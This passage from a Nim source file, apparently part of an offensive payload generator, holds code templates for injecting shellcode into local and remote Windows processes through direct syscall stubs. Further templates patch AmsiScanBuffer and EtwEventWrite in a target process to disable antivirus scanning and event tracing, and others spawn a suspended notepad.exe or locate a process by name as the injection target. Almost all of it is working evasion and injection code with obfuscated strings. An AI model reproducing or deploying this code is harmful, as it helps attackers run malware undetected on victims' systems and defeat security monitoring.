        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
        let syscallStub_NtOpenP = MyVirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )
    else:
        let tProcess2 = GetCurrentProcessId()
        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
        let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)


    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )
    echo obf("[*] NtOpenProcess: "), status

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    when defined(DInvoke):
        var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
    else:
        var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)
    echo obf("[*] NtCreateThreadEx: "), status
    status = NtClose(tHandle)
    status = NtClose(pHandle)

    if(status == 0):
      return true
    else:
      return false
    # This doesn't work so far for some reason
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    if (success):
      echo obf("set back old protect")
    echo success

"""

let RemoteLoadAMSIStub* = """

proc remoteLoadAmsi(processID: var DWORD): bool =

   
    # C:\windows\system32\amsi.dll
    var friendlycode: array[28, char]  = [char(0x43), char(0x3A), char(0x5C), char(0x77), char(0x69), char(0x6E), char(0x64),
     char(0x6F), char(0x77), char(0x73), char(0x5C), char(0x73), char(0x79), char(0x73), char(0x74), char(0x65), char(0x6D),
     char(0x33), char(0x32), char(0x5C), char(0x61), char(0x6D), char(0x73), char(0x69),char(0x2E), char(0x64), char(0x6C), char(0x6C)]
    
    echo obf("[*] Loading amsi.dll in the remote process: "), processID
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

    when defined(DInvoke):
        let tProcess2 = MyGetCurrentProcessId()
        MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
        let syscallStub_NtOpenP = MyVirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )
    else:
        let tProcess2 = GetCurrentProcessId()
        let pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        let syscallStub_NtOpenP = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )

    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )
    echo obf("[*] NtOpenProcess: "), status

    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    when defined(DInvoke):
        var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
    else:
        var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        pfnThreadRtn, 
        ds, FALSE, 0, 0, 0, NULL)
    echo obf("[*] NtCreateThreadEx: "), status
    status = NtClose(tHandle)
    status = NtClose(pHandle)

    if(status == 0):
      return true
    else:
      return false
    # This doesn't work so far for some reason
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    if (success):
      echo obf("set back old protect")
    echo success

"""

let RemotePatchAMSIStub* = """

proc RemotePatchAmsi(hProcss :HANDLE): bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    elif defined i386:
        #let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
        let patch: array[1, byte] = [byte 0x74] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112

    var disabled: bool = false
   
    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get amsi.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    RemoteProc = RemoteProc + 0x83 # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0
    var success: BOOL

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    var protectAddress = RemoteProc

    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    success = NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory for remote process failed")
        return disabled
    echo obf("[*] Applying remote Syscall AMSI patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcss,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
    if (success != 0):
        echo obf("NtWriteVirtualMemory for remote process failed")
        return disabled
    success =  NtProtectVirtualMemory(hProcss,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("NtProtectVirtualMemory for remote process failed")
        return disabled
    else:
        echo obf("[*] OldProtect set back")
        disabled = true
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), 4096, PAGE_READWRITE, addr op)
    return disabled

when isMainModule:
    when defined(DInvoke):
        var hProcams = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    else:
        var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchAmsi(hProcams)
    if (success == 0):
        success = remoteLoadAmsi(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchAmsi(hProcams)
    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"

"""

let RemotePatchETWStub* = """

proc RemotePatchEtw(hProcess : HANDLE) : bool =

    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    
    var disabled: bool = false
    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
    if RemoteHandle == 0:
        echo obf("[X] Failed to get ntdll.dll handle")
        return disabled

    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
    if RemoteProc == NULL:
        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
        return disabled

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)

    var oldProtection: DWORD = 0
    var success: BOOL

    # Define NtProtectVirtualMemory
    var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    var protectAddress = RemoteProc

    success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))

    var friendlycodeLength = cast[SIZE_T](patch.len)
    var t: ULONG
    var op: ULONG
    success = NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
    if (success != 0):
        echo obf("NtProtectVirtualMemory for remote process failed")
        return disabled
    echo obf("[*] Applying remote Syscall ETW patch")
    var outLength: SIZE_T
    
    success = NtWriteVirtualMemory(hProcess,RemoteProc,unsafeAddr patch,patch.len,addr outLength)
    if (success != 0):
        echo obf("NtWriteVirtualMemory for remote process failed")
        return disabled
    success =  NtProtectVirtualMemory(hProcess,addr protectAddress,addr friendlycodeLength,t,addr op)
    if (success != 0):
        echo obf("NtProtectVirtualMemory for remote process failed")
        return disabled
    else:
        disabled = true
        echo obf("[*] OldProtect set back")
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), 4096, PAGE_READWRITE, addr op)

    #if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
    #    echo obf("Failed to write process memory")
    #    return disabled
    #else:
    #    disabled = true
    return disabled

when isMainModule:
    when defined(DInvoke):
        var hProcetw = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    else:
        var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
    success = RemotePatchEtw(hProcetw)
    if (success == 0):
        success = remoteLoadNtdll(remoteProcID)
        HowMuchTimeWouldYoulikeToSleep(2)
        success = RemotePatchEtw(hProcetw)
    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"

"""



let NotepadProcIDStub * = """
import osproc
# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
let tProcess = startProcess(obf("notepad.exe"))
tProcess.suspend() # That's handy!
tProcess.close()

echo obf("[*] Target Process: "), tProcess.processID
var remoteProcID = DWORD(tProcess.processID)

"""

let ShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let ShellcoderemoteinjectStub_customprocfirst * = fmt"""

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
var found: bool = false
for m in remoteprocesses:
    if found == true: continue
    echo obf("Checking: ") & $m
    processID = FindPidByName(m)
    if (processID):
        found = true

echo obf("[*] Target Process: "), processID
var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = fmt"""

proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""

let ShellcoderemoteinjectStub * = """
    
    when defined(DInvoke):
        let tProcess2 = MyGetCurrentProcessId()

        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
        let syscallStub_NtOpenP = MyVirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )
    else:
        let tProcess2 = GetCurrentProcessId()

        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

        let syscallStub_NtOpenP = VirtualAllocEx(
        pHandle2,
        NULL,
        cast[SIZE_T](SYSCALL_STUB_SIZE),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
        )

    
    var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)


    var oldProtection: DWORD = 0

    # define NtOpenProcess
    var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
    VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
    VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

    # define NtCreateThreadEx
    let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
    VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

    var status: NTSTATUS
    var success: BOOL

    success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
    success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

    
    status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, &cid         
    )


    status = NtAllocateVirtualMemory(
        pHandle, &ds, 0, &sc_size, 
        MEM_COMMIT, 
        PAGE_EXECUTE_READWRITE)

    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr friendlycode, 
        sc_size-1, 
        addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, FALSE, 0, 0, 0, NULL)

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    # This doesn't work so far for some reason
    when defined(DInvoke):
        success = MyVirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    else:
        success = VirtualProtect(syscallStub_NtOpenP, cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READ, addr oldProtection)
    if (success):
      echo obf("set back old protect")
    echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let LocalInjectDelegates * = """
# Unmanaged NTDLL Declarations
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}

"""


let RemoteInjectDelegates * = """
# Unmanaged NTDLL Declarations
type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
type myNtAllocateVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall.}
type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
type myNtCreateThreadEx = proc(ThreadHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ProcessHandle: HANDLE, StartRoutine: PVOID, Argument: PVOID, CreateFlags: ULONG, ZeroBits: SIZE_T, StackSize: SIZE_T, MaximumStackSize: SIZE_T, AttributeList: PPS_ATTRIBUTE_LIST): NTSTATUS {.stdcall.}

"""

let SyscallStubSizeStub * = """
var 
    SYSCALL_STUB_SIZE: int = 23
"""

let ShellcodelocalStub * = """

proc pwndem[byte](friendlycode: openarray[byte]): void =

    when defined(DInvoke):
        let tProcess = MyGetCurrentProcessId()
        var pHandle: HANDLE = MyGetCurrentProcess()

        let syscallStub_NtAlloc = MyVirtualAllocEx(
            pHandle,
            NULL,
            cast[SIZE_T](SYSCALL_STUB_SIZE),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )
    else:
        let tProcess = GetCurrentProcessId()
        var pHandle: HANDLE = GetCurrentProcess()

        let syscallStub_NtAlloc = VirtualAllocEx(
            pHandle,
            NULL,
            cast[SIZE_T](SYSCALL_STUB_SIZE),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )

    when defined(Fluctuate):
        g_fluctuationData.shellcodeAddr = unsafeAddr friendlycode[0]
        g_fluctuationData.shellcodeSize = SIZE_T(friendlycode.len)
        # Will change the hardcoded key later on
        when defined(amd64):
            g_fluctuationData.encodeKey = 0x1337DE4D
        when defined(i386):
            g_fluctuationData.encodeKey = 0x1337
        g_fluctuationData.currentlyEncrypted = false
        g_fluctuationData.protect = PAGE_READWRITE
        g_fluctuate = FluctuateToRW
        if (hookSleep()):
            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
        else:
            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

    var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
    
    var oldProtection: DWORD = 0
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
    var ds: LPVOID
    
    cid.UniqueProcess = tProcess
    var success: BOOL

    # define NtAllocateVirtualMemory
    let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    # define NtWriteVirtualMemory
    let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
    when defined(DInvoke):
        success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
    else:
        success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)

    var status: NTSTATUS
    
    success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
    success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
  
    cid.UniqueProcess = tProcess

    status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
    echo obf("[*] NtAllocateVirtualMemory: "), status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

    echo obf("[*] NtWriteVirtualMemory: "), status
    echo obf("    \\-- bytes written: "), bytesWritten
    echo obf("")
    
    let f = cast[proc(){.nimcall.}](ds)
    f()

    status = NtClose(pHandle)


when isMainModule:
     pwndem(dectext)

"""


let PELoadStub * = """

from winim import size_t

proc getNtHdrs*(pe_buffer: ptr BYTE): ptr BYTE =
    if pe_buffer == nil:
      return nil
